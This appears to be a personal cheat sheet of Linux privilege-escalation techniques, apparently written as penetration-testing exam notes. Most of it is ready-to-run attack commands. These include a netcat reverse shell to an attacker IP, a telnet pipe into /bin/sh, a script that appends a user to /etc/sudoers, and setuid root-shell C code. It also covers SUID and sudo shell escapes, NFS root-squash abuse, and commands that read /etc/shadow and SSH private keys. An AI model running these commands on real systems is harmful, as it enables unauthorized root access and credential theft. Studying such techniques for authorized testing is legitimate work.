Linux Scripts for Priv escalation :

1.  Priv checker : https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
              https://www.securitysift.com/download/linuxprivchecker.py
2. Linux Enum : https://github.com/rebootuser/LinEnum.git
3. LinPeas : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
4. Linux Process snooping : https://github.com/DominicBreuker/pspy
5. Cheat sheet : https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
6. https://gtfobins.github.io/#
7. https://github.com/Anon-Exploiter/SUID3NUM
8. http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
9. https://github.com/jondonas/linux-exploit-suggester-2
10. https://github.com/mzet-/linux-exploit-suggester

 
wget  https://www.securitysift.com/download/linuxprivchecker.py 

git clone https://github.com/rebootuser/LinEnum.git
 
Python linuxprivchecker.py > /notes.txt
 
 
Privilege scalation commands :
 
Preparation & Finding Exploit Code :
 
1. How can files be uploaded?                                                                                              All in linuxpc
	find / -name wget
	find / -name nc*
	find / -name netcat*
	find / -name tftp*
	find / -name ftp
2. What development tools/languages are installed/supported?                                   All in linuxpc
	find / -name perl*
	find / -name python*
	find / -name gcc*
	find / -name cc
	 
FILE SYSTEM  :
 
3. Which configuration files can be written in /etc/? Able to reconfigure a service?                                                                All in linuxpc
	ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
	ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
	ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
	ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
	 
	find /etc/ -readable -type f 2>/dev/null               # Anyone
	find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
	 
4. What can be found in /var/ ?                                                                      Can be checked                                                                       
	ls -alh /var/log
	ls -alh /var/mail
	ls -alh /var/spool
	ls -alh /var/spool/lpd
	ls -alh /var/lib/pgsql
	ls -alh /var/lib/mysql
	cat /var/lib/dhcp3/dhclient.leases
	 
5. Any settings/files (hidden) on website? Any settings file with database information?                                                              Can be checked
	ls -alhR /var/www/
	ls -alhR /srv/www/htdocs/
	ls -alhR /usr/local/www/apache22/data/
	ls -alhR /opt/lampp/htdocs/
	ls -alhR /var/www/html/
	 
6. Is there anything in the log file(s) (Could help with "Local File Includes"!)                                                              All in linuxpc
	cat /etc/httpd/logs/access_log
	cat /etc/httpd/logs/access.log
	cat /etc/httpd/logs/error_log
	cat /etc/httpd/logs/error.log
	cat /var/log/apache2/access_log
	cat /var/log/apache2/access.log
	cat /var/log/apache2/error_log
	cat /var/log/apache2/error.log
	cat /var/log/apache/access_log
	cat /var/log/apache/access.log
	cat /var/log/auth.log
	cat /var/log/chttp.log
	cat /var/log/cups/error_log
	cat /var/log/dpkg.log
	cat /var/log/faillog
	cat /var/log/httpd/access_log
	cat /var/log/httpd/access.log
	cat /var/log/httpd/error_log
	cat /var/log/httpd/error.log
	cat /var/log/lastlog
	cat /var/log/lighttpd/access.log
	cat /var/log/lighttpd/error.log
	cat /var/log/lighttpd/lighttpd.access.log
	cat /var/log/lighttpd/lighttpd.error.log
	cat /var/log/messages
	cat /var/log/secure
	cat /var/log/syslog
	cat /var/log/wtmp
	cat /var/log/xferlog
	cat /var/log/yum.log
	cat /var/run/utmp
	cat /var/webmin/miniserv.log
	cat /var/www/logs/access_log
	cat /var/www/logs/access.log
	ls -alh /var/lib/dhcp3/
	ls -alh /var/log/postgresql/
	ls -alh /var/log/proftpd/
	ls -alh /var/log/samba/
	 
	Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
	 
7. If commands are limited, you break out of the "jail" shell?
	python -c 'import pty;pty.spawn("/bin/bash")'
	echo os.system('/bin/bash')
	/bin/sh -i
	 
8. How are file-systems mounted?
	mount
	df -h
	 
9. Are there any unmounted file-systems?
	cat /etc/fstab
	 
10. What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
	find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
	find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
	find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
	 
	find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
	for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
	 
	# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
	find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
	 
11. Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm                   All in linuxpc
	find / -writable -type d 2>/dev/null      # anyoneifcan-writeable folders by any
	find / -perm -222 -type d 2>/dev/null     # world-writeable folders
	find / -perm -o w -type d 2>/dev/null     # world-writeable folders
	find / -perm -2000 -type d 2>/dev/null  # SGID folders
	find / -perm -4000 -type d 2>/dev/null  #SUID folders
	 
	find / -perm -o x -type d 2>/dev/null     # world-executable folders
	 
	find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
	 
	12. Any "problem" files? Word-writeable, "nobody" files
	find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
	find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
	 
Communications & Networking
	 
11. What NIC(s) does the system have? Is it connected to another network?
	/sbin/ifconfig -a
	cat /etc/network/interfaces
	cat /etc/sysconfig/network
	cat  /etc/sysctl.conf                                             ----> security configs
	 
12. What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
	cat /etc/resolv.conf                                       ---->gateway
	cat /etc/sysconfig/network
	cat  /etc/sysctl.conf
	cat /etc/networks
	iptables -L
	hostname
	dnsdomainname
	 
13. What other users & hosts are communicating with the system?
	lsof -i
	lsof -i :80
	grep 80 /etc/services                    -----> all services dns dhcp www
	netstat -antup                             >udptcp
	netstat -antpx                             >alltcpnumbprocessunix
	netstat -tulpn                             >listenonly
	chkconfig --list
	chkconfig --list | grep 3:on
	Last                                                ------> reboot history
	W                                                   ------->last login user
	 
14. Whats cached? IP and/or MAC addresses
	arp -e
	route
	/sbin/route -nee
	 
15. Is packet sniffing possible? What can be seen? Listen to live traffic
	tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
	 
16. Have you got a shell? Can you interact with the system?
	nc -lvp 4444    # Attacker. Input (Commands)
	nc -lvp 4445    # Attacker. Ouput (Results)
	telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
	 
17. Is port forwarding possible? Redirect and interact with traffic from another view
	Note: http://www.boutell.com/rinetd/
	Note: http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
	Note: http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip
	 
	Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
	 
	FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
	 
	Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
	 
	ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
	ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
	 
	Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
	mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
	mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
	mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
	 
18. Is tunnelling possible? Send commands locally, remotely
	ssh -D 127.0.0.1:9050 -N [username]@[ip]
	proxychains ifconfig
	 
19. ss -ta ( All tcp connections )   //-n for not resolve port name
	ss -lt (listening tcp connections )
	ss- ua ( ALL udp)
	ss -lu ( listening udp)
	ss -l (All listening connections )
	ss -a (All connections )
	ss (All connections )
	ss -p ( PID of sockets )
	ss -s(summary stats)
	ss -4 (IPV4)
	ss -6 (IPV6)
	ss -at '( dport = :22 or sport = :22 )'   (filter by port number)
	 
	 
	Applications & Services
	 
20. What services are running? Which service has which user privilege?                                                                                                       NO POS
	ps aux
	ps -ef
	top
	cat /etc/services
	 
21. Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!                       Not that imp, can be checked though
	ps aux | grep root
	ps -ef | grep root
	 
22. What applications are installed? What version are they? Are they currently running?                                                                    Not that imp, can be checked though
	ls -alh /usr/bin/
	ls -alh /sbin/
	dpkg -l
	rpm -qa
	ls -alh /var/cache/apt/archives
	ls -alh /var/cache/yum/
	 
23. Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?                                                              can be checked though
	cat /etc/syslog.conf
	cat /etc/chttp.conf
	cat /etc/lighttpd.conf
	cat /etc/cups/cupsd.conf
	cat /etc/inetd.conf
	cat /etc/apache2/apache2.conf
	cat /etc/my.conf
	cat /etc/httpd/conf/httpd.conf
	cat /opt/lampp/etc/httpd.conf
	ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
	 
24. What jobs are scheduled?                                                                                                                      All in linuxpc
	crontab -l
	ls -alh /var/spool/cron*
	ls -al /etc/ | grep cron
	ls -al /etc/cron*
	cat /etc/cron*
	cat /etc/at.allow
	cat /etc/at.deny
	cat /etc/cron.allow
	cat /etc/cron.deny
	cat /etc/crontab
	cat /etc/anacrontab
	cat /var/spool/cron/crontabs/root
	grep "CRON" /var/log/cron.log
	 
	{  FYI
	- /etc/cron.d ---> used by packages
	- /etc/crontab ---> system crontab (with additional user directive)
	- /var/spool/cron/crontabs ---> user crontab
	}
	 
	 
25. Any plain text usernames and/or passwords?                                                                                          Can be checked
	grep -i user [filename]
	grep -i pass [filename]
	grep -C 5 "password" [filename]
	find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
	 
	Operating System
	 
26. What's the distribution type? What version?                                                                                            All in linuxpc
	cat /etc/issue                                                                           
	cat /etc/*-release
	cat /etc/lsb-release      # Debian based
	cat /etc/redhat-release   # Redhat based
	 
27. What's the kernel version? Is it 64-bit?                                                                                                         All in linuxpc
	cat /proc/version
	uname -a
	uname -mrs
	rpm -q kernel
	dmesg | grep Linux
	ls /boot | grep vmlinuz-
	 
28. What can be learnt from the environmental variables?                                                                               Not that imp, can be checked though
	cat /etc/profile
	cat /etc/bashrc
	cat ~/.bash_profile
	cat ~/.bashrc
	cat ~/.bash_logout
	env
	Set
	 
29. Is there a printer?                                                                                                                                                 Not that imp, can be checked though
	lpstat -a
	 
	Confidential Information & Users
	 
30. Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?    All in linuxpc
	id
	who
	w
	last
	cat /etc/passwd | cut -d: -f1    # List of users
	grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
	awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
	cat /etc/sudoers
	sudo -l       
	 
31. What sensitive files can be found?                                               IN linuxpc
	cat /etc/passwd
	cat /etc/group
	cat /etc/shadow
	ls -alh /var/mail/
	 
32. Anything "interesting" in the home directorie(s)? If it's possible to access    -----NOT PO
	ls -ahlR /root/
	ls -ahlR /home/
	 
33. Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords         Can be checked though
	cat /var/apache2/config.inc
	cat /var/lib/mysql/mysql/user.MYD
	cat /root/anaconda-ks.cfg
	 
34. What has the user being doing? Is there any password in plain text? What have they been edting?        All in linuxpc
	cat ~/.bash_history
	cat ~/.nano_history
	cat ~/.atftp_history                                                                         
	cat ~/.mysql_history
	cat ~/.php_history
	 
35. What user information can be found?                                                Can be checked though
	cat ~/.bashrc
	cat ~/.profile
	cat /var/mail/root
	cat /var/spool/mail/root
	 
36. Can private-key information be found?                                                                              Very Imp
	cat ~/.ssh/authorized_keys
	cat ~/.ssh/identity.pub
	cat ~/.ssh/identity
	cat ~/.ssh/id_rsa.pub
	cat ~/.ssh/id_rsa
	cat ~/.ssh/id_dsa.pub
	cat ~/.ssh/id_dsa
	cat /etc/ssh/ssh_config
	cat /etc/ssh/sshd_config
	cat /etc/ssh/ssh_host_dsa_key.pub
	cat /etc/ssh/ssh_host_dsa_key
	cat /etc/ssh/ssh_host_rsa_key.pub
	cat /etc/ssh/ssh_host_rsa_key
	cat /etc/ssh/ssh_host_key.pub
	cat /etc/ssh/ssh_host_key
	 
 
 
FYI : If you are curious what are all the files that this program tries (and does) access on your system, check out the `strace` utility like this: `strace -f ./replace_with_your_filename
	 
 
	 
StepByStep :
 
1. Trial and error : Check for different files in folders , possible to find a binary to execute , look at permissions closely for each file
2. Check users at /home and ls -laR
3. find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
4. Check for loopback connections , incase of any web/http ( ss)
5. nmap localhost
6. nmap --interactive , if nmap is present
7. find / -perm -222 -type d 2>/dev/null   // all writable folders
8. find / -name ‘*.php’ | grep config
9. Script for Root : 
           #!/usr/bin/env python
	import os
	import sys
	try:
	        os.system('echo "overflow ALL=(ALL:ALL) ALL" >> /etc/sudoers')
	except:
	        sys.exit()
10. echo -e '#!/usr/bin/env python\nimport os\nos.setuid(1001)\nos.setgid(1001)\nos.system("/bin/bash")' > test.py
11. import os
                        os.system("cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash")
11. echo "'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.37 1234' >/tmp/f" > test.py
12. Check if root squash is not enabled in any of shared nfs , then create a file cp /bin/bash shell,  then from attacker machine set its UID chmod 4777 shell, then run ./shell -p from victim machine  // example is orcus 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++HACKS__________________________________________
Linux Priv Esc 
https://payatu.com/guide-linux-privilege-escalation
https://www.reddit.com/r/oscp/comments/9ystub/i_absolutely_suck_at_privilege_escalation/
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
https://www.prodefence.org/beroot-for-linux-privilege-escalation-project/


1. Kernel exploits (Last to look for )
Requirements : file transfers tools like FTP, TFTP, SCP, wget, and curl
The infamous DirtyCow exploit – Linux Kernel <= 3.19.0-73.8

2. Exploiting services which are running as root 
check if web servers, mail servers, database servers, etc. are running as root.
netstat -antup : It shows you all the ports which are open and are listening
ps -aux | grep root – It shows us the services which are running as root.
Eg : EternalBlue and SambaCry exploit , Exploiting a vulnerable version of MySQL which is running as root

Processes running as root that don't have any business doing that. Mysql is a big offender here; if it's running as root you probably want to have a go at it
Try to login and issue below command for SQL 
select sys_exec('whoami');
select sys_eval('whoami');
or raptor SQL method  http://dillidba.blogspot.com/2016/01/get-root-shell-access-using-mysql-with.html

3. Exploiting SUID Executables and any root owned file that can be written

find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

find / -perm -222 -type d 2>/dev/null ( World writable files)
find . -writable ( writable by the user )

SUID bit on any file editor/compiler/interpreter

FOR nmap :
Eg : if namp has SUID set

$ nmap –interactive – runs nmap interactive mode
$ nmap !sh – Lets you escape to the system shell from nmap shell
nmap -v   to check version
nmap 2.02 to 5.21 are vulnerable

exploit/unix/local/setuid_nmap



www-data@metasploitable:/var/tmp$ TF=$(mktemp)
www-data@metasploitable:/var/tmp$ echo 'os.execute("/bin/sh")' > $TF
www-data@metasploitable:/var/tmp$ /usr/bin/nmap localhost --script=$TF
Starting Nmap 4.53 ( http://insecure.org ) at 2020-04-26 14:45 EDT
SCRIPT ENGINE: Warning: Loading '/tmp/tmp.FrEHDD5051' - the recommended file extension is '.nse'.
sh-3.2#
sh-3.2# whoami


find kartk -exec whoami \;
Known Linux executables that can allow privilege escalation are:

Nmap
Vim,Vi
find
Bash
More
Less
Nano
cp
awk
docker
file viewer
mv
ftp / sftp
git
mount
rsync
scripting languages - lua,python,perl,ruby
tar
tcpdump
wget
zip

Some know SUID normally present in linux





SUID3NUM
https://null-byte.wonderhowto.com/how-to/find-exploit-suid-binaries-with-suid3num-0215789/
https://gtfobins.github.io/#
https://github.com/Anon-Exploiter/SUID3NUM


Python script that can find SUID binaries, distinguish between default and custom ones, and attempt to exploit them using the GTFOBins repository
GTFOBins is an impressive collection of Unix binaries that can be utilized for privilege escalation


SUID for symlinks like cp is SUID 

4. Exploiting SUDO rights/user  : https://pure.security/how-i-got-root-with-sudo/

sudo -l – Prints the commands which we are allowed to run as SUDO

Eg : sudo find /home -exec sh -i \;

awk,bash,cp,find,ht,less,more,mv,man,nano,nc,nmap,python/perl/ruby/lua/etc, vi/vim  : https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html


5. Exploiting badly configured cron jobs
ls -la /etc/cron.d – prints cron jobs which are already present in cron.d
$ find / -perm -2 -type f 2>/dev/null – prints world writable files
$ ls -la /usr/local/sbin/cron-logrotate.sh – Let’s confirm if the cron-logrotate.sh is world writable


crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

Eg :

int main(void)
{
setgid(0);
setuid(0);
execl("/bin/sh","sh",0);
}

echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;”>/usr/local/sbin/cron-logrotate.sh

./rootme


6. Exploiting users with ‘.’ in their PATH : https://hackmag.com/security/reach-the-root/

check using echo $PATH

With ‘.’ in path – program
Without ‘.’ in path – ./program

$ PATH=.:${PATH} – adds ‘.’ in the PATH variable


7. Some weird custom SW which not part of linux distros official package --  ///use a script to find 
8. If your "netstat -antp" shows listening services that only accept 127.0.0.1 or are otherwise filtered by iptables, immediately tunnel them out via SSH and poke at them from your kali box. Also, try netstat -anlp, netstat -ano
9. Known bad packages with SUID executables. While reading through the list of SUID binaries, it's worth looking at their package version (privchecker will get that for you) and making sure they aren't vulnerable to privesc exploits. Exim is a good example of this.
10. Strangeness in the common "sensitive" files. Know the permissions of /etc/passwd, /etc/shadow, /etc/cron* by heart, as well as the common service config files, and be ready to spot when you can read or write something you shouldn't
11. always worth taking a very close look at everything you find on your user's home directory. If you find config files, scripts, binaries, text files
12. Weak/reused/plaintext passwords


    Check file where webserver connect to database (config.php or similar)
    Check databases for admin passwords that might be reused
    Check weak passwords

username:username
username:username1
username:root
username:admin
username:qwerty
username:password

Check plaintext password

# Anything interesting the the mail?
/var/spool/mail
./LinEnum.sh -t -k password


13. Unmounted filesystems : Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

mount -l
cat /etc/fstab
 

14. NFS Share : 

If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.

# First check if the target machine has any NFS shares
showmount -e 192.168.1.101

# If it does, then mount it to you filesystem
mount 192.168.1.101:/ /tmp/

If that succeeds then you can go to /tmp/share. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.

If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.

This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:

chmod 4777 exploit

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}

15. Manual page command :  manual ls 
then !/bin/sh (check brainplan vulnhub)

14. tmux -S /.devs/devs_sess   : If it is root owned , to get a tmux session as root
